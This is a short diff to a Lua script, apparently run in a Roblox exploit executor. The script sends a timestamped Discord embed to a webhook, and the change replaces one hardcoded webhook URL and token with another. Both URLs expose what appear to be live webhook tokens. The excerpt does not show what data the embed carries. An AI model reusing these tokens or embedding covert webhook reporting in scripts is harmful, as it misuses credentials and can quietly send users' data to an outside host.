@@ -56,7 +56,7 @@ local Embed = {
             ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = 'https://discord.com/api/webhooks/925356027099091034/E7DnNonp5YagPm_uMfjcaX_mcE4ydf6hyA7RVOJlP4UvcVTzNUTdVGFRIvm5Cxvu0eLR';
+    Url = 'https://discord.com/api/webhooks/926009613348913192/foYmRY6O26j3DG4ejn_NGKKcp5ZUwWGFei1NNyK_adiotaHh6ZkdKIYxhi35svroIat0';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
